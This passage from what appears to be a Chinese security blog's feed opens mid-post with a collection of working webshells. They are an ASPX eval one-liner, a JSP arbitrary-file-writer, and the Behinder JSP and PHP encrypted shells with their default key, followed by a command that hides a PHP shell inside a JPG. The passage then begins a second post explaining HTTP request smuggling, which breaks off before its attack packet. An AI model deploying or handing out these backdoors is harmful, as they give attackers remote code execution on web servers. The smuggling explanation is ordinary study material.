class=&#34;line&#34;&gt;&amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot; validateRequest=&amp;quot;false&amp;quot; %&amp;gt;&amp;lt;%Response.Write(eval(Request.Item[&amp;quot;milkii0&amp;quot;],&amp;quot;unsafe&amp;quot;));%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;jsp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jsp&#34;&gt;#&lt;/a&gt; jsp&lt;/h2&gt;
&lt;figure class=&#34;highlight jsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.getParameter(&lt;span class=&#34;string&#34;&gt;&amp;quot;file_name&amp;quot;&lt;/span&gt;)!=&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;)(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; java.io.FileOutputStream(application.getRealPath(&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;)+request.getParameter(&lt;span class=&#34;string&#34;&gt;&amp;quot;file_name&amp;quot;&lt;/span&gt;))).write(request.getParameter(&lt;span class=&#34;string&#34;&gt;&amp;quot;file_content&amp;quot;&lt;/span&gt;).getBytes()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;冰蝎系列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#冰蝎系列&#34;&gt;#&lt;/a&gt; 冰蝎系列&lt;/h1&gt;
&lt;h2 id=&#34;jsp-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jsp-2&#34;&gt;#&lt;/a&gt; jsp&lt;/h2&gt;
&lt;figure class=&#34;highlight jsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%&lt;span class=&#34;meta&#34;&gt;@page&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&amp;quot;&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;U&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ClassLoader&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    U(ClassLoader c)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Class &lt;span class=&#34;title&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;byte&lt;/span&gt; []b)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;.defineClass(b,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,b.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (request.getMethod().equals(&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String k=&lt;span class=&#34;string&#34;&gt;&amp;quot;e45e329feb5d925b&amp;quot;&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    session.putValue(&lt;span class=&#34;string&#34;&gt;&amp;quot;u&amp;quot;&lt;/span&gt;,k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Cipher c=Cipher.getInstance(&lt;span class=&#34;string&#34;&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c.init(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; SecretKeySpec(k.getBytes(),&lt;span class=&#34;string&#34;&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; U(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;.getClass().getClassLoader()).g(c.doFinal(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;php-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-2&#34;&gt;#&lt;/a&gt; php&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;e45e329feb5d925b&amp;quot;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;k&amp;#x27;&lt;/span&gt;]=&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	session_write_close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;=file_get_contents(&lt;span class=&#34;string&#34;&gt;&amp;quot;php://input&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!extension_loaded(&lt;span class=&#34;string&#34;&gt;&amp;#x27;openssl&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;base64_&amp;quot;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;decode&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$t&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;&amp;lt;strlen(&lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;);&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    			 &lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;[&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;] = &lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;[&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;]^&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;[&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;amp;&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;=openssl_decrypt(&lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;AES128&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;=explode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$post&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$params&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;C&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;);&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @call_user_func(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; C(),&lt;span class=&#34;variable&#34;&gt;$params&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;图片马合成命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#图片马合成命令&#34;&gt;#&lt;/a&gt; 图片马合成命令&lt;/h1&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;copy 1.jpg+1.php 2.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</guid>
            <title>HTTP请求走私简述</title>
            <link>http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</link>
            <category>web,HTTP</category>
            <pubDate>Tue, 03 Aug 2021 10:20:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;http请求走私是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http请求走私是什么&#34;&gt;#&lt;/a&gt; HTTP 请求走私是什么&lt;/h1&gt;
&lt;p&gt;HTTP 请求走私，一种干扰网站处理来自用户的 HTTP &lt;ins class=&#34;wavy&#34;&gt;请求序列&lt;/ins&gt; 的技术&lt;/p&gt;
&lt;h2 id=&#34;相关知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#相关知识点&#34;&gt;#&lt;/a&gt; 相关知识点&lt;/h2&gt;
&lt;p&gt;该漏洞的产生主要和 HTTP 请求中的两个头相关：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;spoiler&#34; title=&#34;...&#34;&gt;Transfer_Encoding&lt;/span&gt;  &amp;amp; &lt;span class=&#34;spoiler&#34; title=&#34;...&#34;&gt;Content-Length&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;transfer-encoding&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#transfer-encoding&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding&#34;&gt;Transfer-Encoding&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Transfer-Encoding 通用标头字段指示已对消息正文应用了什么（如果有）类型的转换，以便在发送方和接收方之间安全地传输它，在 HTTP1.1 中可用&lt;/p&gt;
&lt;p&gt;利用该漏洞，需指定参数为 chunked  &lt;code&gt; Transfer-Encoding: chunked&lt;/code&gt; ，表示数据以一系列块发送，而不是等到完整的段可用&lt;/p&gt;
&lt;p&gt;在 CTE 中，每个块前面都有它的大小（字节为单位）&lt;/p&gt;
&lt;p&gt;当接收到零长度块时（不可省略），传输结束&lt;/p&gt;
&lt;p&gt;✋🌰&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;数据包喔&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HTTP/1.1 200 OK &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Transfer-Encoding: chunked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5\r\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Media\r\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8\r\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Services\r\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4\r\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Live\r\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0\r\n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;\r\n&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一部分： 当前组块长度（16 进制）+ \r\n&lt;/p&gt;
&lt;p&gt;第二部分： 块内容 + \r\n&lt;/p&gt;
&lt;p&gt;（例如 Media 就是 5 个字节长度）&lt;/p&gt;
&lt;p&gt;倒数第二部分： 终止块 -&amp;gt; 分块编码以任何大小为零的块结束，长度为 0 -&amp;gt; 0\r\n&lt;/p&gt;
&lt;p&gt;最后一部分： 以空行终止（\r\n）&lt;/p&gt;
&lt;h3 id=&#34;content-length&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#content-length&#34;&gt;#&lt;/a&gt; Content-Length&lt;/h3&gt;
&lt;p&gt;该字段指示发送给接受者的实体主体的大小，以十进制的 OCTET 数表示&lt;/p&gt;
&lt;p&gt;这个可以自己用 burp 发包试试哦，bp 的 repeat 选项中默认开启了 Update Content-Length 选项&lt;/p&gt;
&lt;h3 id=&#34;注意connection&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注意connection&#34;&gt;#&lt;/a&gt; ⭐注意 Connection&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;每当传输编码应用于消息体时，传输编码集必须包括 “分块”，除非消息因关闭连接而终止&lt;/p&gt;
&lt;p&gt;——&lt;a href=&#34;https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.6&#34;&gt;HTTP/1.1: Protocol Parameters&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说，当连接关闭时，也会导致消息终止&lt;/p&gt;
&lt;p&gt;那么我们在发送数据包时，就需要注意 &lt;ins&gt;Connection&lt;/ins&gt; 头&lt;/p&gt;
&lt;p&gt;Connection: keep-alive -&amp;gt; 表示客户端希望保持连接打开，拥有持久连接是 HTTP/1.1 请求的默认设置&lt;/p&gt;
&lt;p&gt;Connection: close -&amp;gt; 表示客户端或服务器想要关闭连接，这是 HTTP/1.0 请求的默认设置&lt;/p&gt;
&lt;h1 id=&#34;http请求走私的原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http请求走私的原理&#34;&gt;#&lt;/a&gt; HTTP 请求走私的原理&lt;/h1&gt;
&lt;p&gt;现很多应用程序使用 HTTP 服务链（2 个或多个服务器）&lt;/p&gt;
&lt;p&gt;其中前端服务器有时称为负载均衡器或反向代理&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;burp图片哦&#34;&gt;&lt;/p&gt;
&lt;p&gt;这时，若前端后端系统就请求之间的边界没有达成一致，就可以发送一个模棱两可的请求，让前端和后端系统对该请求进行不同的解释&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;👇👇👇&lt;/p&gt;
&lt;p&gt;由于 HTTP 规范提供了两种方法指定消息长度（Content-Length&amp;amp;Transform-Encoding），所以单个消息​同时使用两种方法时，不同的服务器可能出现不同的解释&lt;/p&gt;
&lt;p&gt;如果消息头以某种方式模糊了，则可以诱导消息头不处理它&lt;/p&gt;
&lt;p&gt;👆👆👆&lt;/p&gt;
&lt;h1 id=&#34;http请求走私利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http请求走私利用&#34;&gt;#&lt;/a&gt; HTTP 请求走私利用&lt;/h1&gt;
&lt;p&gt;请求走私大致分为 3️⃣种类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://CL.ET&#34;&gt;CL.ET&lt;/a&gt; -&amp;gt; 前端服务器使用 Content-Length，后端服务器使用 Transfer-Encoding&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://TE.CL&#34;&gt;TE.CL&lt;/a&gt; -&amp;gt; 前端服务器使用 Transfer-Encoding，后端服务器使用 Content-Length&lt;/li&gt;
&lt;li&gt;TE.TE -&amp;gt; 前后端均使用 Transfer-Encoding，但其中一个服务器可被某种方式诱导不处理该头部字段&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实验环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验环境&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://portswigger.net/web-security/request-smuggling&#34;&gt;实验环境&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;但是不知道为什么我一直没办法注册 portswigger，只能分析一下给出的例子了&lt;/p&gt;
&lt;h3 id=&#34;clet&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#clet&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;http://CL.ET&#34;&gt;CL.ET&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;攻击数据包&lt;/p&gt;
